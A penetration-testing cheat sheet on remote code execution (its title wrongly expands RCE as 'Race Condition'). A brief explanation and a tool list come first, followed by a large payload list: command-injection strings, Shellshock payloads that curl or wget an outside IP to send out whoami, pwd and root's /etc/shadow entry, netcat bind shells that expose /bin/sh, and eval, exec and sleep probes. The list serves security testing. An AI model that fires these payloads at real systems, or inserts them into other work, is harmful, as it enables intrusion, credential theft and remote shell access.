# Race Condition (RCE) or Remote Code Execution

Remote Code Execution (RCE) is a type of vulnerability that allows an attacker to execute arbitrary code on a target system remotely. This vulnerability can be exploited by attackers to gain complete control over the target system, allowing them to steal sensitive information, install malware, and even take over entire networks. Penetration testers and bug bounty hunters often look for RCE vulnerabilities in web applications, as they can be highly critical and result in significant payouts.

## What is RCE?

Remote Code Execution (RCE) is a type of vulnerability that allows an attacker to execute arbitrary code on a target system remotely. This vulnerability is typically found in web applications that accept user input, such as forms, search boxes, or file upload functionality. If an application fails to properly validate or sanitize user input, an attacker may be able to inject malicious code that can be executed on the server.

## How does RCE work?

To exploit an RCE vulnerability, an attacker typically needs to find a way to inject malicious code into the target system. This can be done in a variety of ways, depending on the specific vulnerability and the security controls in place. Some common methods for injecting malicious code include:

* Command Injection: An attacker may be able to inject arbitrary commands into an application, which are then executed on the server. This can be done by exploiting vulnerabilities in application logic, such as improperly sanitized user input.

* File Upload Vulnerabilities: An attacker may be able to upload a malicious file, such as a web shell, which can be executed on the server.

* Remote File Inclusion (RFI): An attacker may be able to include a remote file on the target system, which can then be executed.

Once an attacker has successfully injected malicious code into the target system, they can execute arbitrary commands, read and write files, and even take over the entire system.

## Examples of how to find RCE vulnerabilities

Finding RCE vulnerabilities can be a challenging task, as there are many different ways that attackers can inject malicious code into a system. However, there are some common techniques and tools that can be used to identify potential vulnerabilities:

* Manual Testing: One of the most effective ways to find RCE vulnerabilities is to manually test web applications for vulnerabilities. This involves examining the application logic, looking for areas where user input is accepted, and attempting to inject malicious code to see if it can be executed.

* Automated Scanning: There are many tools available that can automate the process of testing web applications for vulnerabilities. These tools typically scan the application for common vulnerabilities, including RCE, and report any issues that are found.

* Code Analysis: Another effective technique for finding RCE vulnerabilities is to perform a code analysis of the application. This involves examining the source code for vulnerabilities, looking for areas where user input is accepted and not properly validated or sanitized.

Overall, RCE vulnerabilities can be highly critical, allowing attackers to gain complete control over a target system remotely. Penetration testers and bug bounty hunters should be familiar with the various techniques and tools used to identify these vulnerabilities, as well as the methods used to exploit them. By staying up to date with the latest security trends and techniques, testers can help ensure that web applications remain secure and protected against malicious attacks.

## Tools for RCE Conditions
[bane](https://github.com/AlaBouali/bane) = python module that contains functions and classes that are used to test the security of web/network applications
Burp Suite
[0wned](https://github.com/mschwager/0wned) - Code execution via Python package installation
[remote-code-runner](https://github.com/michaelliao/remote-code-runner) - A remote code running service
[rce-agent](https://github.com/square/rce-agent) - A gRPC based Remote Command Execution Agent
[presshell](https://github.com/scheatkode/presshell) - Get a command shell from a wordpress website



## RCE Payloads

**Some Basics**
```
|| 
| 
; 
'
'"
"
"'
& 
&& 
%0a
%0a%0d
%0Acat%20/etc/passwd
%0Aid
%0a id %0a
%0Aid%0A
%0a ping -i 30 127.0.0.1 %0a
%0A/usr/bin/id
%0A/usr/bin/id%0A
%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
%20{${phpinfo()}}
%20{${sleep(20)}}
%20{${sleep(3)}}
a|id|
a;id|
a;id;
a;id\n
```
**Bash**
```
() { :;}; /bin/bash -c "curl http://135.23.128.10/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
() { :;}; /bin/bash -c "curl http://135.23.128.10/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
() { :;}; /bin/bash -c "curl http://135.23.158.10/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "curl http://135.23.158.10/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
() { :;}; /bin/bash -c "curl http://135.23.158.10/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
() { :;}; /bin/bash -c "curl http://135.23.158.10/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
() { :;}; /bin/bash -c "curl http://135.23.158.10/.testing/shellshock.txt?vuln=5"
() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.10/.testing/shellshock.txt?sleep=1&?vuln=6"
() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.10/.testing/shellshock.txt?sleep=3&?vuln=7"
() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.10/.testing/shellshock.txt?sleep=6&?vuln=8"
() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.10/.testing/shellshock.txt?sleep=9&?vuln=9"
() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
() { :;}; /bin/bash -c "wget http://135.23.158.10/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
() { :;}; /bin/bash -c "wget http://135.23.158.10/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
() { :;}; /bin/bash -c "wget http://135.23.158.10/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "wget http://135.23.158.10/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
() { :;}; /bin/bash -c "wget http://135.23.158.10/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
() { :;}; /bin/bash -c "wget http://135.23.158.10/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
() { :;}; /bin/bash -c "wget http://135.23.158.10/.testing/shellshock.txt?vuln=4"
```

**Cat and Curl**
```
cat /etc/hosts
$(`cat /etc/passwd`)
cat /etc/passwd
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
| curl http://crowdshield.com/.testing/rce.txt
& curl http://crowdshield.com/.testing/rce.txt
; curl https://crowdshield.com/.testing/rce_vuln.txt
&& curl https://crowdshield.com/.testing/rce_vuln.txt
curl https://crowdshield.com/.testing/rce_vuln.txt
 curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
```
**Dir**
```
dir
| dir
; dir
$(`dir`)
& dir
&&dir
&& dir
| dir C:\
; dir C:\
& dir C:\
&& dir C:\
dir C:\
| dir C:\Documents and Settings\*
; dir C:\Documents and Settings\*
& dir C:\Documents and Settings\*
&& dir C:\Documents and Settings\*
dir C:\Documents and Settings\*
| dir C:\Users
; dir C:\Users
& dir C:\Users
&& dir C:\Users
dir C:\Users
```
**eval**
```
eval('ls')
eval('pwd')
eval('pwd');
eval('sleep 5')
eval('sleep 5');
eval('whoami')
eval('whoami');
```
**exec**
```
exec('ls')
exec('pwd')
exec('pwd');
exec('sleep 5')
exec('sleep 5');
exec('whoami')
exec('whoami');
```
**NetCat**
```
| nc -lvvp 4444 -e /bin/sh|
; nc -lvvp 4444 -e /bin/sh;
& nc -lvvp 4444 -e /bin/sh&
&& nc -lvvp 4444 -e /bin/sh &
nc -lvvp 4444 -e /bin/sh
nc -lvvp 4445 -e /bin/sh &
nc -lvvp 4446 -e /bin/sh|
nc -lvvp 4447 -e /bin/sh;
nc -lvvp 4448 -e /bin/sh&
```
**sleep based**
```
| sleep 1
; sleep 1
& sleep 1
&& sleep 1
sleep 1
|| sleep 10
| sleep 10
; sleep 10
{${sleep(10)}}
& sleep 10 
&& sleep 10
sleep 10
|| sleep 15
| sleep 15
; sleep 15
& sleep 15 
&& sleep 15
 {${sleep(20)}}
{${sleep(20)}}
 {${sleep(3)}}
{${sleep(3)}}
| sleep 5
; sleep 5
& sleep 5
&& sleep 5
sleep 5
 {${sleep(hexdec(dechex(20)))}} 
{${sleep(hexdec(dechex(20)))}}
```
